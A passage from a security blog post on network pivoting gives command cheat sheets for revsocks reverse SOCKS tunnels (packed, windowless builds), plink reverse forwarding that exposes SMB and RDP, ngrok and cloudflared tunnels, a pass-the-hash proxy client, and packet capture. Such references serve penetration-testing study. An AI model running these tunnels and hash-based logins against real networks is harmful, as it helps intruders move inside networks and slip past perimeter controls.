<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \</span><br><span class="line">--ntlm-proxy-port 8080 --domain CORP --username jdoe \</span><br><span class="line">--hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE</span><br></pre></td></tr></table></figure>

<h2 id="0x0B-revsocks"><a href="#0x0B-revsocks" class="headerlink" title="0x0B revsocks"></a>0x0B revsocks</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Listen on the server and create a SOCKS 5 proxy on port 1080</span><br><span class="line">user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234</span><br><span class="line"></span><br><span class="line"># Connect client to the server</span><br><span class="line">user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234</span><br><span class="line">user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent &quot;Mozilla 5.0/IE Windows 10&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Build for Linux</span><br><span class="line">git clone https://github.com/kost/revsocks</span><br><span class="line">export GOPATH=~/go</span><br><span class="line">go get github.com/hashicorp/yamux</span><br><span class="line">go get github.com/armon/go-socks5</span><br><span class="line">go get github.com/kost/go-ntlmssp</span><br><span class="line">go build</span><br><span class="line">go build -ldflags=&quot;-s -w&quot; &amp;&amp; upx --brute revsocks</span><br><span class="line"></span><br><span class="line"># Build for Windows</span><br><span class="line">go get github.com/hashicorp/yamux</span><br><span class="line">go get github.com/armon/go-socks5</span><br><span class="line">go get github.com/kost/go-ntlmssp</span><br><span class="line">GOOS=windows GOARCH=amd64 go build -ldflags=&quot;-s -w&quot;</span><br><span class="line">go build -ldflags -H=windowsgui</span><br><span class="line">upx revsocks</span><br></pre></td></tr></table></figure>

<h2 id="0x0C-plink"><a href="#0x0C-plink" class="headerlink" title="0x0C plink"></a>0x0C plink</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># exposes the SMB port of the machine in the port 445 of the SSH Server</span><br><span class="line">plink -l root -pw toor -R 445:127.0.0.1:445 </span><br><span class="line"># exposes the RDP port of the machine in the port 3390 of the SSH Server</span><br><span class="line">plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  </span><br><span class="line"></span><br><span class="line">plink -l root -pw mypassword 192.168.18.84 -R</span><br><span class="line">plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445</span><br><span class="line"></span><br><span class="line">plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]</span><br><span class="line"># redirects the Windows port 445 to Kali on port 22</span><br><span class="line">plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185</span><br></pre></td></tr></table></figure>

<h2 id="0x0D-ngrok"><a href="#0x0D-ngrok" class="headerlink" title="0x0D ngrok"></a>0x0D ngrok</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># get the binary</span><br><span class="line">wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip</span><br><span class="line">unzip ngrok-stable-linux-amd64.zip </span><br><span class="line"></span><br><span class="line"># log into the service</span><br><span class="line">./ngrok authtoken 3U[REDACTED_TOKEN]Hm</span><br><span class="line"></span><br><span class="line"># deploy a port forwarding for 4433</span><br><span class="line">./ngrok http 4433</span><br><span class="line">./ngrok tcp 4433</span><br></pre></td></tr></table></figure>

<h2 id="0x0E-cloudflared"><a href="#0x0E-cloudflared" class="headerlink" title="0x0E cloudflared"></a>0x0E cloudflared</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Get the binary</span><br><span class="line">wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz</span><br><span class="line">tar xvzf cloudflared-stable-linux-amd64.tgz</span><br><span class="line"># Expose accessible internal service to the internet</span><br><span class="line">./cloudflared tunnel --url &lt;protocol&gt;://&lt;host&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x0F-流量捕获分析"><a href="#0x0F-流量捕获分析" class="headerlink" title="0x0F 流量捕获分析"></a>0x0F 流量捕获分析</h2><h3 id="1-Windows-netsh"><a href="#1-Windows-netsh" class="headerlink" title="1. Windows (netsh)"></a>1. Windows (netsh)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># start a capture use the netsh command.</span><br><span class="line">netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384</span><br><span class="line"></span><br><span class="line"># stop the trace</span><br><span class="line">netsh trace stop</span><br><span class="line"></span><br><span class="line"># Event tracing can be also used across a reboots</span><br><span class="line">netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\trace.etl maxsize=16384</span><br><span class="line"></span><br><span class="line"># To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version.</span><br><span class="line">etl2pcapng.exe c:\trace.etl c:\trace.pcapng</span><br><span class="line"></span><br><span class="line"># Use filters</span><br><span class="line">netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384</span><br></pre></td></tr></table></figure>

<h3 id="2-Linux-tcpdump"><a href="#2-Linux-tcpdump" class="headerlink" title="2. Linux (tcpdump)"></a>2. Linux (tcpdump)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install tcpdump</span><br><span class="line">tcpdump -w 0001.pcap -i eth0</span><br><span class="line">tcpdump -A -i eth0</span><br><span class="line"></span><br><span class="line"># capture every TCP packet</span><br><span class="line">tcpdump -i eth0 tcp</span><br><span class="line"></span><br><span class="line"># capture everything on port 22</span><br><span class="line">tcpdump -i eth0 port 22</span><br></pre></td></tr></table></figure>

<h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
<li><a target="_blank" rel="noopener" href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/pivoting/">https://www.offensive-security.com/metasploit-unleashed/pivoting/</a></li>
<li><a target="_blank" rel="noopener" href="http://woshub.com/port-forwarding-in-windows/">http://woshub.com/port-forwarding-in-windows/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.tcpdump.org/manpages/tcpdump.1.html">https://www.tcpdump.org/manpages/tcpdump.1.html</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Linux/" rel="tag" <i class="fa fa-tag"></i> Linux</a>
              <a href="/tags/Network-Pivoting/" rel="tag" <i class="fa fa-tag"></i> Network Pivoting</a>
              <a href="/tags/Port-Forwarding/" rel="tag" <i class="fa fa-tag"></i> Port Forwarding</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/66228/" rel="prev" title="Windows系统安全机制">
                  <i class="fa fa-chevron-left"></i> Windows系统安全机制
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/18896/" rel="next" title="Linux Rootkit技术研究">
                  Linux Rootkit技术研究 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
</div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/third-party/pace.js"></script>

  





</body>
</html>
